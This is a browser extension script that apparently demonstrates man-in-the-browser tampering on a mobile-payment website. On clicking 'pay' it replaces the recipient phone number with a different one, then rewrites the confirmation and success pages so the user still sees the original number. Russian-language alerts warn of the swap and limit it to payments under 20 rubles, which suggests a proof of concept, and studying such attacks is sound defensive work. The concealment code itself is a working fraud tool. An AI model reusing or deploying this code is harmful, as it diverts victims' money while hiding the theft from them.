var visible_number = null;
var substituted_number = null;

chrome.storage.local.get(null, function(items){
	visible_number = items.visible_number;
	substituted_number = items.substituted_number;
	console.log("visible="+visible_number+", substituted="+substituted_number);
	if (visible_number){
		console.log("replacing visible content");
		try{
			var confirmation_table_selector = "table.b-payment-challenge__font-size_m";
			var thankyou_table_selector = "table.b-payment-success__info";
			
			// confirmation page
			if ($(confirmation_table_selector).length > 0){
				var starred_number_selector = confirmation_table_selector+" tr:eq(0)";
				var number_selector = confirmation_table_selector+" tr:eq(2)";
				var starred_substituted_number = substituted_number.replace(/^\d\d\d/, '***');
				var starred_visible_number = visible_number.replace(/^\d\d\d/, '***');
				$("h1").html($("h1").html().replace(starred_substituted_number, starred_visible_number));

				$(starred_number_selector).html($(starred_number_selector).html().replace(starred_substituted_number, starred_visible_number));
				$(number_selector).html($(number_selector).html().replace(substituted_number, visible_number));
				alert("Номер был заменён! Если вы подтвердите платеж, реальная оплата пойдёт не на "+visible_number+", а на "+substituted_number+"!");
			}
			
			// thank you page
			else if ($(thankyou_table_selector).length > 0){
				var number_selector = thankyou_table_selector+" tr:eq(0)";
				$(number_selector).html($(number_selector).html().replace(substituted_number, visible_number));
				chrome.storage.local.clear();
			}
		}
		catch(e){
			console.log(e);
		}
	}
});

// works in payment data page
document.addEventListener('click', function(e){
	console.log("click");
	var button = $("form[name=phone] input[type=submit].b-form-button__input").get(0);
	if (!button)
		return;
	if (e.target !== button && !$.contains(button, e.target))
		return;
	console.log("pay button clicked");
	var amount = $("#sum").val();
	if (amount >= 20){
		console.log("amount is too large, skipping");
		chrome.storage.local.clear();
		return;
	}
	visible_number = $("#phone-number").val();
	substituted_number = (parseInt(visible_number)+1)+"";
	$("#phone-number").val(substituted_number);
	chrome.storage.local.set({
		visible_number: visible_number,
		substituted_number: substituted_number
	});
	console.log("saved");
	
	// displays the old number while the page is unloading
	$(window).bind('beforeunload', function() {
		console.log("beforeunload");
		$("#phone-number").val(visible_number);
	});
}, true);

$("#phone-number").on('focusout', function(){
	var visible_number = $(this).val();
	var substituted_number = (parseInt(visible_number)+1)+"";
	alert("Номер будет изменен на "+substituted_number+', если сумма платежа меньше 20 рублей! Вы соглашаетесь с заменой номера, если нажимаете кнопку "Заплатить"');
});
